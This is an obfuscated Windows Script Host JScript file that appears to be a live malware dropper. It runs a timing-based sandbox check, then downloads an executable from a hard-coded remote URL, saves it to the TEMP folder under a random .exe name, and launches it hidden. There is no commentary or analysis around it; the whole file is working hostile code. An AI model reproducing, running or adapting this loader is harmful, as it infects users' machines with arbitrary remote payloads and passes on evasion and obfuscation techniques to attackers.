var N = false;
var Du = "CreateObject";
var NJ = function lA() {return WScript[Du]("WScript.Shell");}(), s = 11;
var qv = "MSXML2.XMLHTTP";
var i = 2123213;
var b0 = 0;
function NF(ST){NJ["Run"](ST, b0, b0);};
function b(){return "" + qv;};
function B(rc, Jt){b0 = b0 * 1; return rc - Jt;};
function v0(){return Du;};
/*@cc_on
  @if (@_win32 || @_win64)
    N = true;
  @end
@*/
if (N)
{
var fI = "";
function v(){return 22;};
var k = 0; var Yj = 0;
function H()
{
var GS = new this["Date"]();
var h = GS["getUTCMilliseconds"]();
WScript["Sleep"](v());
var GS = new this["Date"]();
var gM = GS["getUTCMilliseconds"]();
WScript["Sleep"](v());
var GS = new this["Date"]();
var u = GS["getUTCMilliseconds"]();
var k = "GL";
k = B(gM, h);
var Yj = "x";
Yj = B(u, gM);
fI = "open";
return B(k, Yj);
}
var oV = false;
var Pd = false;
for (var Nf = b0; Nf < v() * 1; Nf++){if (H() != b0){
oV = true; 
Yj = "31" + 11 * k + Yj; 
Pd = true; 
break;
}}
function D() {return ((oV == true) && (oV == Pd)) ? 1 : b0;};
if (oV && D() && Pd){
function sK() {return NJ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "dwl1bvBReSZvtRuO.exe";};
 E = b();
 KQ = WScript[Du](E);
 var O = 1;
 while (O){
try {
KQ[fI]("GET", "http://blog.insite.pt/m8djs", false);
KQ["send"]();
kh = "Sleep";
for (;;){WScript[kh](v() * 11); if (KQ["readystate"] >= 2 * 2) break;};
O = b0;
} catch(u0){};
}
function oP(Z) {var kI = (1, 2, 3, 4, 5, Z); return kI;};
U = WScript[v0()]("ADODB.Stream");
E = U;
E[fI]();
E["type"] = oP(1);
E["write"](KQ["ResponseBody"]);
U["position"] = oP(b0);
E["Save" + "ToFile"](sK(), 2);
U["c"+"lose"]();
Yu = sK();
NF(Yu);
}
}

